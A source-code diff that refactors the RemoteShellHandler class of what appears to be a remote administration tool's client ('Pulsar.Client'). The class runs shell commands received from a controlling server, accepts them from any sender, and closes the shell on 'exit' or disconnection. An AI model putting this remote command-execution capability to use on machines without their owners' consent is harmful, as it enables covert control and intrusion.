@@ -13,85 +13,96 @@ namespace Pulsar.Client.Messages
     /// </summary>
     public class RemoteShellHandler : IMessageProcessor, IDisposable
     {
-        /// <summary>
-        /// The current remote shell instance.
-        /// </summary>
         private Shell _shell;
-
-        /// <summary>
-        /// The client which is associated with this remote shell handler.
-        /// </summary>
         private readonly PulsarClient _client;
+        private bool _disposed;
 
-        /// <summary>
-        /// Initializes a new instance of the <see cref="RemoteShellHandler"/> class using the given client.
-        /// </summary>
-        /// <param name="client">The associated client.</param>
         public RemoteShellHandler(PulsarClient client)
         {
             _client = client;
             _client.ClientState += OnClientStateChange;
         }
 
-        /// <summary>
-        /// Handles changes of the client state.
-        /// </summary>
-        /// <param name="s">The client which changed its state.</param>
-        /// <param name="connected">The new connection state of the client.</param>
         private void OnClientStateChange(Networking.Client s, bool connected)
         {
-            // close shell on client disconnection
             if (!connected)
             {
-                _shell?.Dispose();
+                DisposeShell();
             }
         }
 
-        /// <inheritdoc />
-        public bool CanExecute(IMessage message) => message is DoShellExecute;
+        public bool CanExecute(IMessage message)
+        {
+            return message is DoShellExecute;
+        }
 
-        /// <inheritdoc />
-        public bool CanExecuteFrom(ISender sender) => true;
+        public bool CanExecuteFrom(ISender sender)
+        {
+            return true;
+        }
 
-        /// <inheritdoc />
         public void Execute(ISender sender, IMessage message)
         {
-            switch (message)
+            if (_disposed)
+                return;
+
+            var shellMsg = message as DoShellExecute;
+            if (shellMsg == null)
+                return;
+
+            string cmd = shellMsg.Command;
+            if (cmd == null)
+                return;
+
+            cmd = cmd.Trim();
+
+            // If shell is not created yet
+            if (_shell == null)
             {
-                case DoShellExecute shellExec:
-                    Execute(sender, shellExec);
-                    break;
+                // No point creating a shell just to exit immediately
+                if (string.Equals(cmd, "exit", StringComparison.OrdinalIgnoreCase))
+                    return;
+
+                _shell = new Shell(_client);
+            }
+
+            // Exit command
+            if (string.Equals(cmd, "exit", StringComparison.OrdinalIgnoreCase))
+            {
+                DisposeShell();
+                return;
+            }
+
+            // Execute normally
+            _shell.ExecuteCommand(cmd);
+        }
+
+        private void DisposeShell()
+        {
+            try
+            {
+                if (_shell != null)
+                    _shell.Dispose();
+            }
+            catch
+            {
+                // swallow – safe cleanup only
+            }
+            finally
+            {
+                _shell = null;
             }
         }
 
-        private void Execute(ISender client, DoShellExecute message)
-        {
-            string input = message.Command;
-
-            if (_shell == null && input == "exit") return;
-            if (_shell == null) _shell = new Shell(_client);
-
-            if (input == "exit")
-                _shell.Dispose();
-            else
-                _shell.ExecuteCommand(input);
-        }
-
-        /// <summary>
-        /// Disposes all managed and unmanaged resources associated with this message processor.
-        /// </summary>
         public void Dispose()
         {
-            Dispose(true);
-            GC.SuppressFinalize(this);
-        }
+            if (_disposed)
+                return;
 
-        protected virtual void Dispose(bool disposing)
-        {
-            if (disposing)
-            {
-                _shell?.Dispose();
-            }
+            _disposed = true;
+
+            DisposeShell();
+            _client.ClientState -= OnClientStateChange;
         }
     }
 }
